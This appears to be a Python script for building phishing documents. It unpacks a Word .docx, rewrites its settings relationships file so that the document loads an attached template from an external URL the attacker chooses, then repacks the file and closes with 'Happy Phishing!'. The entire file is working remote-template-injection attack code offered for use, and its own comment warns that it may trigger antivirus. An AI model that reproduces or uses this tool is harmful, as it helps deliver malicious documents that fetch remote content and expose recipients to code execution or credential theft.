import os
import shutil
import colorama

# NOTE: THIS EXECUTES SYSTEM COMMANDS WHICH MAY FLAG SOME ANTIVIRUS SOFTWARE. THIS IS NECESSARY TO INJECT THE TEMPLATE.

# pathToDoc - path to document to inject template into
# url - URL where template to inject is hosted

# create a temporary directory, copy the document into that directory, unzip it, go into the word/_rels folder
# then overwrite the existing template file & inject the url
def injector(pathToDoc, url):
    os.mkdir("temp")
    os.chdir("temp")
    shutil.copyfile(pathToDoc, "injected.zip")
    if os.name == "nt":
        # use powershell to unzip
        print(colorama.Fore.LIGHTBLUE_EX + "[+] Windows system detected! Using Powershell for unzipping...")
        os.system("powershell.exe Expand-Archive -LiteralPath {0} -DestinationPath {1}".format("injected.zip", "."))
        os.chdir("word\\_rels\\")
    else:
        # use unzip cmd to unzip
        print(colorama.Fore.LIGHTYELLOW_EX + "[+] Linux system detected! Using zip for unzipping...")
        os.system("unzip {0}".format("injected.zip"))
        os.chdir("word/_rels/")
    
    print(colorama.Fore.LIGHTGREEN_EX + "[+] Injecting template into document...")
    f = open("settings.xml.rels", "w+")
    f.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{0}" TargetMode="External"/></Relationships>'''.format(url))
    f.close()
    

    # rezip
    if os.name == "nt":
        os.chdir("..\\..\\")
        os.remove("injected.zip")
        print(colorama.Fore.LIGHTGREEN_EX + "[+] Re-zipping content...")
        os.system("powershell.exe Compress-Archive * -DestinationPath injected.zip")
        os.rename("injected.zip", "..\\injected.docx")
        os.chdir("..\\")
        shutil.rmtree("temp") # removing nonempty directory
        print(colorama.Fore.LIGHTGREEN_EX + "[+] Your newly injected template is available at {0}. Happy Phishing!".format(os.getcwd() + "\\injected.docx"))
    else:
        os.chdir("../../")
        os.remove("injected.zip")
        print(colorama.Fore.LIGHTGREEN_EX + "[+] Re-zipping content...")
        os.system("zip -r injected.zip *")
        os.rename("injected.zip", "../injected.docx") # rename & move newly injected document up 1 directory out of the temp dir we created
        # move up 1 dir & remove the temp dir we created
        os.chdir("../")
        shutil.rmtree("temp")
        print(colorama.Fore.LIGHTGREEN_EX + "[+] Your newly injected template is available at {0}. Happy Phishing!".format(os.getcwd() + "/injected.docx"))
